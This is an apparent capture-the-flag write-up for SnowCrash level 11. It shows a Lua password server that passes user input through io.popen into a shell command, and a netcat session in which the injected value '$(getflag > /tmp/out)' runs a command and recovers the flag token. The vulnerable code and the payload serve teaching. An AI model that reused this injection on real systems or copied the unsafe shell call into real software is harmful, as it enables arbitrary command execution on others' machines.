# Level 11

## Analysis

We discovered a file in the home directory named `level11.lua`, containing the following Lua script:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

This script listens on port 5151 for connections, prompts for a password, hashes the input using SHA1 via a call to `io.popen` with `echo` and `sha1sum`, and compares it to a hardcoded hash value. If the hashes match, it sends a congratulatory message; otherwise, it denies access.

The vulnerability lies in the script's use of `io.popen` to execute shell commands, enabling command injection through the password input. By injecting commands into the password, we can execute arbitrary shell commands on the server.

To exploit this vulnerability, we sent a crafted string to the server using netcat, which injects a shell command to write the output of `getflag` to a file:

```sh
level10@SnowCrash:~$ nc 127.0.0.1 5151
Password: $(getflag > /tmp/out)
Erf nope..
level10@SnowCrash:~$ cat /tmp/out
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

This command injection allowed us to retrieve the flag by executing `getflag` and redirecting its output to a file, which we then read.

**Type of Exploit**: Command Injection